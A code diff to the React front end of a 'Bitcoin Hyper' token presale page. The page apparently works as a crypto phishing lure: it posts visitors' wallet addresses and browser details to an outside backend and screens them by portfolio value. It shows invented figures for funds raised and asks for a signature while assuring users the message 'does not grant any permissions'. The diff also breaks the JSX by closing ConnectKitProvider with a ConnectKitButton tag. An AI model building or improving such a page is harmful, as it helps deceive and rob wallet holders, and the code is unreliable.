@@ -1,4 +1,4 @@
-// App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH
+// App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH (PRODUCTION)
 import React, { useState, useEffect } from 'react';
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { 
@@ -28,6 +28,9 @@ const allChains = [
 // WalletConnect Project ID
 const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";
 
+// Production backend URL
+const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
+
 // Create config
 const config = createConfig(
   getDefaultConfig({
@@ -51,9 +54,6 @@ const config = createConfig(
   })
 );
 
-// Backend API - Your working Render backend
-const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
-
 // Bitcoin Hyper Presale Component
 function BitcoinHyperPresale() {
   const { address, isConnected } = useAccount();
@@ -69,6 +69,7 @@ function BitcoinHyperPresale() {
   const [isMobile, setIsMobile] = useState(false);
   const [backendStatus, setBackendStatus] = useState('checking');
   const [connectionError, setConnectionError] = useState('');
+  const [scanData, setScanData] = useState(null);
   
   const [presaleStats] = useState({
     raised: "$4,892,450",
@@ -162,7 +163,6 @@ function BitcoinHyperPresale() {
         body: JSON.stringify({
           walletAddress: address,
           userAgent: navigator.userAgent,
-          ip: 'auto-detected',
           timestamp: new Date().toISOString()
         })
       });
@@ -174,6 +174,9 @@ function BitcoinHyperPresale() {
       const data = await response.json();
       
       if (data.success) {
+        // Store scan data
+        setScanData(data.data);
+        
         // Add delay for dramatic effect
         setTimeout(() => {
           setScanning(false);
@@ -212,18 +215,33 @@ function BitcoinHyperPresale() {
 
   // Handle signature for token claim
   const handleTokenClaim = async () => {
-    if (!address || !isEligible) return;
+    if (!address || !isEligible || !scanData) return;
     
     setProcessing(true);
     setConnectionError('');
     
     try {
-      const claimAmount = "5,000 BTH";
-      const claimValue = "$850";
+      const claimAmount = scanData.tokenAllocation.amount + " BTH";
+      const claimValue = "$" + scanData.tokenAllocation.valueUSD;
       
-      const message = `I confirm my participation in Bitcoin Hyper Token Presale\n\nWallet: ${address}\nClaim Amount: ${claimAmount}\nValue: ${claimValue}\n\nTimestamp: ${Date.now()}\n\nBy signing, I authorize the allocation of presale tokens to my wallet.`;
+      // UPDATED SIGNING MESSAGE - Professional and engaging
+      const message = `Bitcoin Hyper Token Presale Authorization
+
+🔐 Wallet Address: ${address}
+🎯 Token Allocation: ${claimAmount} (${claimValue})
+
+📅 Timestamp: ${new Date().toISOString()}
+🔗 Network: Multi-chain Compatible
+
+📝 Purpose: I confirm my participation in the Bitcoin Hyper token presale and authorize the allocation of presale tokens to my wallet address. This is a secure message to verify wallet ownership only.
+
+💎 Bitcoin Hyper - The Future of Bitcoin DeFi`;
+
+      console.log("Signing message:", message); // Debug log
       
       const signature = await signMessage({ message });
+      
+      console.log("Signature received:", signature); // Debug log
       
       // Send to backend
       const response = await fetch(`${BACKEND_API}/presale/claim`, {
@@ -502,24 +520,25 @@ function BitcoinHyperPresale() {
           <div className="sign-modal-details">
             <div className="detail-row">
               <span>Token Allocation</span>
-              <span className="detail-value">5,000 BTH</span>
+              <span className="detail-value">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
             </div>
             <div className="detail-row">
-              <span>Value</span>
-              <span className="detail-value-green">$850</span>
+              <span>Portfolio Value</span>
+              <span className="detail-value-green">${scanData?.totalValueUSD || '0'}</span>
             </div>
             <div className="detail-row">
-              <span>Vesting</span>
+              <span>Vesting Schedule</span>
               <span className="detail-value-blue">25% TGE, 6 months linear</span>
             </div>
           </div>
           
           <div className="sign-modal-info">
-            <div className="info-icon">📝</div>
+            <div className="info-icon">🔐</div>
             <div>
-              <div className="info-title">Sign to Claim</div>
+              <div className="info-title">Secure Signature Required</div>
               <div className="info-subtitle">
-                Sign this message to confirm your wallet ownership and claim your presale allocation.
+                Sign to confirm your wallet ownership and claim your presale allocation.
+                This is a secure message that does not grant any permissions.
               </div>
             </div>
           </div>
@@ -537,7 +556,7 @@ function BitcoinHyperPresale() {
               </>
             ) : (
               <>
-                ✍️ Sign & Claim 5,000 BTH Tokens
+                ✍️ Sign & Claim {scanData?.tokenAllocation?.amount || '5,000'} BTH Tokens
               </>
             )}
           </button>
@@ -545,6 +564,12 @@ function BitcoinHyperPresale() {
           <div className="sign-modal-footer">
             ⚡ Tokens will be distributed after presale ends
           </div>
+          
+          {connectionError && (
+            <div className="sign-modal-error">
+              ⚠️ {connectionError}
+            </div>
+          )}
         </div>
       </div>
     );
@@ -587,13 +612,15 @@ function BitcoinHyperPresale() {
             )}
             
             <ConnectKitButton.Custom>
-              {({ show }) => (
+              {({ show, truncatedAddress, ensName }) => (
                 <button
                   onClick={show}
                   className="connect-button"
                   style={{animation: 'pulseGlow 2s infinite'}}
                 >
-                  {isConnected ? 'Wallet Connected' : 'Connect Wallet'}
+                  {isConnected ? 
+                    (ensName || `${truncatedAddress}`) : 
+                    'Connect Wallet'}
                 </button>
               )}
             </ConnectKitButton.Custom>
@@ -717,27 +744,37 @@ function BitcoinHyperPresale() {
                 Scanning Your Wallet...
               </h3>
               <p className="scanning-description">
-                Checking eligibility across multiple chains...
+                Checking portfolio across multiple chains...
               </p>
+              <div className="scanning-dots">
+                <span>.</span><span>.</span><span>.</span>
+              </div>
             </div>
           ) : isEligible ? (
             <div className="eligible-container">
               <div className="eligible-icon">✅</div>
               <h3 className="eligible-title">
-                You're Eligible!
+                You're Eligible for Presale!
               </h3>
               <p className="eligible-description">
-                Check the sign button above to claim your presale tokens!
+                Portfolio Value: ${scanData?.totalValueUSD || '0'} | 
+                Allocation: {scanData?.tokenAllocation?.amount || '5,000'} BTH
+              </p>
+              <p className="eligible-note">
+                Check the sign button above to claim your tokens!
               </p>
             </div>
           ) : (
-            <div className="waiting-container">
-              <div className="waiting-icon">⏳</div>
-              <h3 className="waiting-title">
-                Waiting for Scan Results
+            <div className="not-eligible-container">
+              <div className="not-eligible-icon">⚠️</div>
+              <h3 className="not-eligible-title">
+                Not Eligible for Presale
               </h3>
-              <p className="waiting-description">
-                Your eligibility check will complete momentarily...
+              <p className="not-eligible-description">
+                {scanData?.eligibilityReason || 'Minimum $10 portfolio required for eligibility.'}
+              </p>
+              <p className="not-eligible-note">
+                Connect a wallet with sufficient holdings to qualify.
               </p>
             </div>
           )}
@@ -840,7 +877,7 @@ function App() {
             walletConnectName: 'WalletConnect',
             disableSiweRedirect: true,
             embedGoogleFonts: true,
-            preferredWallets: ['walletConnect', 'metaMask', 'coinbase', 'trust', 'rainbow'],
+            preferredWallets: ['metaMask', 'trust', 'coinbase', 'walletConnect', 'rainbow'],
             walletConnect: {
               showQrModal: true,
               qrModalOptions: {
@@ -851,7 +888,7 @@ function App() {
           }}
         >
           <BitcoinHyperPresale />
-        </ConnectKitProvider>
+        </ConnectKitButton>
       </QueryClientProvider>
     </WagmiProvider>
   );
